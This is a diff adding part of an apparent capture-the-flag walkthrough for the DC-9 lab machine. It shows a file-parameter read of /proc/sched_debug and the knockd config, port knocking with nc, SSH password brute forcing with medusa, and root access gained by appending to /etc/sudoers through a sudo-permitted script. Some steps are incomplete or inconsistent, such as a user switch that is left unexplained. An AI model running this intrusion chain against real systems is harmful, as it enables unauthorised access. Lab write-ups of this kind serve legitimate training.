@@ -141,6 +141,129 @@ after we login as admin
 
 
 	we found a paramater mane called file 
+![3]({{site.baseurl}}/_posts/3.png)
+
+
+
+try to get /proc/sched_debug
+
+![4]({{site.baseurl}}/_posts/4.png)
+
+we found **knockd** service in sched_debug 
+
+Now we will go to knockdb.conf 
+![6]({{site.baseurl}}/_posts/6.png)
+
+- Now we can know port knocking sequences 
+- 
+- [options]
+- 	UseSyslog
+- 
+- [openSSH]
+- 	sequence    = 7469,8475,9842
+- 	seq_timeout = 25
+- 	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+- 	tcpflags    = syn
+- 
+- [closeSSH]
+- 	sequence    = 9842,8475,7469
+- 	seq_timeout = 25
+- 	command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+- 	tcpflags    = syn
+
+
+
+we will use this sequence to make port open 
+
+
+ ┌──(root💀Devo)-[/home/devo]
+└─# nc 192.168.162.136 7469                                                                                                                   1 ⨯
+(UNKNOWN) [192.168.162.136] 7469 (?) : Connection refused
+                                                                                                                                                  
+┌──(root💀Devo)-[/home/devo]
+└─# nc 192.168.162.136 8475                                                                                                                   1 ⨯
+(UNKNOWN) [192.168.162.136] 8475 (?) : Connection refused
+                                                                                                                                                  
+┌──(root💀Devo)-[/home/devo]
+└─# nc 192.168.162.136 9842                                                                                                                   1 ⨯
+(UNKNOWN) [192.168.162.136] 9842 (?) : Connection refused
+                                                                                                                                                  
+┌──(root💀Devo)-[/home/devo]
+└─# nc 192.168.162.136 22                                                                                                                     1 ⨯
+SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
+
+                                                           Now Its Opened 
+                                                            
+
+
+
+
+
+
+
+
+now we will Brute force ssh service 
+
+
+
+
+                                                                                                             - ┌──(root💀Devo)-[/home/devo/vuln-machines/DC-8]
+- └─# medusa -C combo -M ssh                                         
+- Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+- 
+- chandlerb : UrAG0D!
+- ACCOUNT FOUND: [ssh] Host: 192.168.162.136 User: janitor Password: Ilovepeepee [SUCCESS]
+
+                                                                                                                              
+                                                                                                                              
+                                                                                                                              
+we connect to macgine with this cred and Now Booom We get Access 
+
+
+
+## Privilige Escalation
+
+
+janitor@dc-9:~$ find .
+.
+./.mysql_history
+./lin.txt
+./.bash_history
+./.gnupg
+./.gnupg/trustdb.gpg
+./.gnupg/pubring.kbx
+./.gnupg/private-keys-v1.d
+./linpeas.sh
+### ./.secrets-for-putin
+### ./.secrets-for-putin/passwords-found-on-post-it-notes.txt
+
+
+
+
+
+- janitor@dc-9:~$ cd ./.secrets-for-putin
+- janitor@dc-9:~/.secrets-for-putin$ ls
+- passwords-found-on-post-it-notes.txt
+- janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt 
+- BamBam01
+- Passw0rd
+- smellycats
+- P0Lic#10-4
+- B4-Tru3-001
+- 4uGU5T-NiGHts
+
+
+
+
+
+take this passwords and put it in  file called pw to try to brute force ssh 
+
+
+ medusa -h 192.168.162.136 -U users -P pw -t 6 -M ssh
+ 
+ACCOUNT FOUND: [ssh] Host: 192.168.162.136 User: fredf Password: B4-Tru3-001 [SUCCESS]
+
+-
 
 
 
@@ -151,35 +274,75 @@ after we login as admin
 
 
 
+- redf@dc-9:~$ sudo -l
+- Matching Defaults entries for fredf on dc-9:
+-     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+- 
+- User fredf may run the following commands on dc-9:
+-     (root) NOPASSWD: /opt/devstuff/dist/test/test
+- fredf@dc-9:~$ /opt/devstuff/dist/test/test
+- Usage: python test.py read append
+- fredf@dc-9:~$ 
+- 
+- 
+- fredf@dc-9:/opt/devstuff$ cat test.py 
+- #!/usr/bin/python
+- 
+- import sys
+- 
+- if len (sys.argv) != 3 :
+-     print ("Usage: python test.py read append")
+-     sys.exit (1)
+- 
+- else :
+-     f = open(sys.argv[1], "r")
+-     output = (f.read())
+- 
+-     f = open(sys.argv[2], "a")
+-     f.write(output)
+-     f.close()
+- 
+- 
+- 
+- 
+- 
+- 
+- fredf@dc-9:/opt/devstuff$ cat /etc/sudoers
+- cat: /etc/sudoers: Permission denied
+- we couldn't read it but we will put aline to it to allow to sudu any thing 
+- 
+- 
+- 
+- 
+- 
+- 
+- 
+- 
+- 
+- 
+- 
+- 
+- 
+- fredf@dc-9:/opt/devstuff$ sudo /opt/devstuff/dist/test/test /tmp/sudo-Add  /etc/sudoers 
+- 
+- joeyt@dc-9:~$ sudo -l
+- 
+- We trust you have received the usual lecture from the local System
+- Administrator. It usually boils down to these three things:
+- 
+-     #1) Respect the privacy of others.
+-     #2) Think before you type.
+-     #3) With great power comes great responsibility.
+- 
+- [sudo] password for joeyt: 
+- Matching Defaults entries for joeyt on dc-9:
+-     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+- 
+- User joeyt may run the following commands on dc-9:
+-     (ALL : ALL) ALL
+- joeyt@dc-9:~$ sudo bash
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+'root@dc-9:/home/joeyt# 
 
 
 
